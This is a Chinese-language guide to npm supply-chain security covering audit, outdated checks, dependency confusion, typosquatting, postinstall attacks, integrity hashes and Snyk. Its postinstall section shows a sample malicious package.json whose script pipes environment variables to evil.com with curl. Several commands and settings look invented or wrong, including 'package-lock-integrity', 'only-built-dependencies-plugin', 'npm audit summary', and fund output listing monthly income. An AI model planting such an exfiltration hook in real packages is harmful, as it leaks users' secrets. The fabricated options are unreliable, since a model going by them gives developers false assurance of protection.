## 概述

npm 生态的安全形势日益严峻。供应链攻击（supply chain attack）已成为最主要的攻击向量之一。了解如何审计漏洞、防范恶意包和保护依赖链安全，是每个前端工程师的必修课。

## npm audit — 内置安全扫描

### 基础用法

```bash
# 扫描项目中所有依赖的已知漏洞
npm audit

# 输出示例：
# found 12 vulnerabilities (4 low, 5 moderate, 2 high, 1 critical)
# run `npm audit fix` to fix 12 of them.

# 详细 JSON 输出
npm audit --json

# 仅输出摘要
npm audit summary
```

### 漏洞严重等级

| 等级 | 说明 | 建议操作 |
|------|------|---------|
| **critical** | 远程代码执行、数据泄露 | **立即修复** |
| **high** | SQL 注入、XSS、提权 | 尽快修复 |
| **moderate** | DoS、信息泄露 | 下个版本修复 |
| **low** | 绕过安全措施 | 计划修复 |
| **info** | 非安全问题但值得注意 | 了解即可 |

### 自动修复

```bash
# 自动修复可以安全更新的漏洞
npm audit fix

# 强制修复（可能包含 breaking change，慎用！）
npm audit fix --force

# 仅模拟修复，不实际修改
npm audit fix --dry-run --json
```

**audit fix 能做什么**：
- 将存在漏洞的依赖更新到安全版本
- 自动修改 package.json 和 lock 文件
- **不能做的**：需要 API 变更的修复、人为引入的漏洞

### 在 CI 中阻断

```bash
# npm audit 非零退出码（有 critical/high 漏洞时）
npm audit --audit-level=moderate

# package.json scripts
{
  "scripts": {
    "security": "npm audit --audit-level=high"
  }
}

# CI pipeline
- name: Security Audit
  run: npm audit --audit-level=high
```

## npm fund — 依赖资金透明

```bash
# 查看每个依赖的资金来源（月收入）
npm fund

# 输出：
# @myorg/ui@1.0.0
#   $350/month → https://github.com/sponsors/alice
# lodash@4.17.21
#   $12,000/month → https://opencollective.com/lodash

# 打开 funding 页面
npm fund lodash
```

**价值**：
- 了解你依赖的包是否有人持续维护
- 支持那些支撑着你项目的基础设施
- 评估依赖的健康度和可持续性

## npm outdated — 过期包检查

```bash
# 检查所有过期依赖
npm outdated

# 输出：
# Package    Current  Wanted  Latest  Location            Depended by by
# react       18.2.0  18.2.0  19.0.0  node_modules/react  my-app
# typescript  5.3.0   5.4.0   5.4.0   node_modules/typescript  my-app

# Current: 当前安装的版本
# Wanted:  符合 semver 范围的最新版
# Latest:  registry 上的绝对最新版

# 仅检查直接依赖
npm outdated --depth=0

# JSON 格式（便于脚本处理）
npm outdated --json
```

### 版本列含义解读

```
Current = Wanted = Latest     → 最新状态 ✅
Current = Wanted < Latest     → 有新的大版本（可能 breaking）
Current < Wanted = Latest     → lock 文件落后于 semver 范围
Current < Wanted < Latest     → 两种都有
```

## 供应链攻击防范

### 攻击向量一览

#### 1. 依赖混淆（Dependency Confusion）

```
攻击原理：
┌─────────────────────────────────────┐
│ 你的 package.json:                  │
│   "internal-pkg": "^1.0.0"          │
│                                     │
│ npm 同时查找：                       │
│   ① 私有 registry → 未找到          │
│   ② 公共 registry → 找到了！        │
│                                     │
│ 攻击者在公共源发布同名包 → 你就中招了 │
└─────────────────────────────────────┘
```

**防御**：

```bash
# 方法一：确保私有源总是优先
# .npmrc
@mycompany:registry=https://npm.private.com/

# 方法二：使用 scoped 包名
# "internal-pkg" → "@mycompany/internal-pkg"
# 公共 registry 上无法发布 @mycompany 作用域的包

# 方法三：Verdaccio 配置
packages:
  '@mycompany/*':
    access: $authenticated
    # 即使上游有也不代理
```

#### 2. Typosquatting（域名抢注式攻击）

```bash
# 你想安装：npm install express
# 手误敲成：  npm install expreess  ← 注意多了个 s
# expreess 可能是恶意包！

# 常见手法：
# express → exprses, exppress, expresss
# lodash   → lodahs, loadsh
# vue      -> veu, vuee

# 防御：
# 1. 安装前仔细检查包名
# 2. npm view <pkg-name> 确认包的信息
# 3. 检查下载量和维护者信誉
```

#### 3. Postinstall 脚本攻击

```jsonc
// 恶意包的 package.json
{
  "name": "malicious-pkg",
  "scripts": {
    "postinstall": "curl http://evil.com/steal?data=$(env | base64)"
  }
}

// npm install malicious-pkg 时自动执行！
```

**防御**：

```bash
# 方法一：使用 --ignore-scripts
npm install --ignore-scripts
# 安装完后再手动审查脚本内容

# 方法二：使用 pnpm 的 onlyBuiltDependencies
# .npmrc
only-built-dependencies-plugin=true

# 方法三：审查 postinstall 脚本
npm ls | while read line; do
  pkg=$(echo "$line" | cut -d'@' -f1)
  cat "node_modules/$pkg/package.json" | grep -A5 '"scripts"'
done

# 方法四：使用专门工具
npx lockfile-lint
npx snyk protect
```

#### 4. 替换攻击（Once Compromised, Always Compromised）

```
场景：
1. lodash@4.17.20 被发现漏洞
2. 作者紧急发布 4.17.21 修复
3. 攻击者入侵作者账号
4. 发布新的 4.17.21（含恶意代码）
5. 所有用户 npm update 后中毒

防御：锁定哈希值（见下方完整性校验）
```

## 完整性校验（Integrity Check）

### package-lock.json v2+ 的 integrity 字段

```json
"lodash": {
  "version": "4.17.21",
  "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
  "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="
}
```

- 使用 **SHA-512** 哈希算法（base64 编码）
- `npm install` 时自动校验，哈希不匹配则拒绝安装
- **绝不手动修改** lock 文件中的 integrity 值

### 强制校验

```bash
# .npmrc
package-lock-integrity=true   # 默认开启，不要关闭！
```

### SRI（Subresource Integrity）浏览器端校验

```html
<!-- CDN 引入时使用 integrity 属性 -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-q8f/Xj8...（base64 SHA-384 哈希）"
  crossorigin="anonymous">
</script>
```

## 第三方安全工具

### Snyk（最流行）

```bash
# 安装 Snyk CLI
npm install -g snyk

# 认证
snyk auth

# 扫描项目
snyk test

# 监控（持续监控 + 邮件告警）
snyk monitor

# 自动修复 PR
snyk wizard

# IDE 插件：VS Code Snyk Advisor
```

**Snyk 免费额度**：公开项目免费，私有项目每月 200 次测试

### 其他工具对比

| 工具 | 类型 | 价格 | 特色 |
|------|------|------|------|
| **Snyk** | SaaS + CLI | 免费层丰富 | 生态最广、IDE 集成好 |
| **npm audit** | 内置 | 免费 | 开箱即用、基础够用 |
| **Socket.dev** | SaaS | 免费层 | 行为分析（不只看 CVE） |
| **Renovate** | Bot | 免费（自托管） | 自动更新依赖 PR |
| **Dependabot** | Bot | 免费（公开） | GitHub 原生集成 |

## 安全最佳实践清单

### 日常开发

- [ ] `npm audit` 加入 CI 流水线，critical/high 漏洞阻断构建
- [ ] 定期执行 `npm outdated`，及时更新依赖
- [ ] 安装包之前先用 `npm view <pkg>` 检查信息
- [ ] 审查 `postinstall` / `preinstall` 脚本内容
- [ ] 使用 `--ignore-scripts` 安装不信任的包

### 项目配置

```bash
# .npmirc（安全强化配置）
package-lock-integrity=true        # 强制完整性校验
only-built-dependencies-plugin=true  # pnpm: 限制可执行脚本
engine-strict=true                # 严格执行引擎版本
```

### 团队/组织层面

- [ ] 使用私有 npm registry（Verdaccio/Nexus）
- [ ] 设置 2FA（npm / GitHub / GitLab）
- [ ] 定期轮换 Token 和密钥
- [ ] 使用 Dependabot / Renovate 自动更新依赖
- [ ] 建立应急响应流程（发现漏洞时的处理 SOP）
- [ ] 维护一份 approved packages 白名单

### 应急响应 SOP

```
1. 收到安全警报（npm audit / Snyk / 邮件通知）
2. 评估影响范围（哪些项目使用了该依赖）
3. 确认修复版本（官方公告 / security advisory）
4. 测试修复版本（回归测试）
5. 分批更新（先低风险项目 → 再核心项目）
6. 更新 CHANGELOG
7. 通知团队成员
8. 事后复盘
```
